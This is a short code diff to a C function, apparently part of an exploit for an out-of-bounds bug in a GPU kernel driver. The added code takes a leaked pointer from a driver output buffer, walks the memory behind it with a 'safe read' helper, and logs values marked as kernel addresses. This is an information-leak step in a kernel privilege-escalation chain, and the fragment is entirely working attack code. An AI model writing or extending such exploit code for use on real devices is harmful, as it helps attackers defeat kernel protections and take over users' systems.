@@ -848,6 +848,24 @@ void nk_iogpu_group_oob_run(int trigger)
                  * group's state lives - and the state holds kernel
                  * pointers (the element array, the bitmap). Read it. */
                 {
+                    uint64_t slotp = 0;
+                    memcpy(&slotp, out7 + 0x10, 8);
+                    if (slotp && slotp < 0x0001000000000000ULL) {
+                        ol("[grp] slot record at 0x%016llx (0xC0 bytes)", (unsigned long long)slotp);
+                        size_t okupto = 0;
+                        for (size_t o = 0; o < 0x100; o += 8) {
+                            uint64_t w = 0;
+                            if (grp_safe_read(slotp + o, &w, 8) != 0) {
+                                ol("[grp]   slot+0x%03zx UNREADABLE (mapping ends here)", o);
+                                break;
+                            }
+                            okupto = o + 8;
+                            if (!w) continue;
+                            ol("[grp]   slot+0x%03zx = 0x%016llx%s", o, (unsigned long long)w,
+                               grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
+                        }
+                        ol("[grp] slot readable up to 0x%zx", okupto);
+                    }
                     uint64_t dbuf = 0, slot = 0, dsz = 0;
                     memcpy(&dbuf, out7 + 0x08, 8);
                     memcpy(&slot, out7 + 0x10, 8);
